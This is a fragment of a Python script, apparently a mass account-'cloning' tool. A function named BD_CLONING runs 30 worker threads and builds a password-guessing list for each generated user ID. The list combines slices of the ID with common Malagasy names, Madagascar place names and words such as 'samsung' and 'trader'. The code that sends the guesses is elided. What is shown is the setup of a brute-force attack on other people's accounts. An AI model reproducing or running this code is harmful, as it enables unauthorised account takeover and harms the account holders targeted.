...
def BD_CLONING():
    ...
    with tred(max_workers=30) as Dipto:
        ...
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'Nantenaina','jessica','Jesicca','nantenaina','nilaina','Nilaina','stephanie','Stephanie','faneva','Faneva','lafatra','Lafatra','liantsoa','Liantsoa','fanilo','Fanilo','fiderana','Fiderana','fitahiana','Fitahiana','filahiana','Filahiana','milely','malagasy','Malagasy','mitia','Mitia','nantenaina','rakoto','Rakoto', 'fandresena', 'Fandresena', 'nomena', 'Nomena', 'lalaina', 'Lalaina', 'diamondra', 'Diamondra', 'mendrika', 'Mendrika', 'finaritra', 'Antananarivo', 'antananarivo', 'Finaritra', 'fanomezana', 'Fanomezana', 'lalatiana','Lalatiana','mialy','Mialy','mandresy','Mandresy','mahery','Mahery','malagasy','Malagasy','miora','Miora','rakotomalala','Rakotomalala','jhonny','Jhonny','faniry','Faniry','fifaliana','Fifaliana','kanto','Kanto','hezekie','Hezekie','razaka','Razaka','safidy','Safidy','lovatiana','Lovatiana','patricia','Patricia','faratiana','Faratiana','rasoa','Rasoa','mamikely','Mamikely','bemaso','Bemaso','narindra','Narindra','tiavina','Tiavina','Havana','havana','analakely','Analakely','anosy','Anosy','Michelin','michelin','madama','Madama','traderfx','Traderfx','gameur','Gameur','Trader fx','trader','Trader','mamisoa','Mamisoa','Valisoa','valisoa','bangladesh','Bangladesh','mangatsiaka','angeline','Angeline','jeancri','rasoa123','maditra','voahangy','Voahangy','Fanantenana','fanantenana','redmi','Redmi','samsung','Samsung','jirama','Jirama']
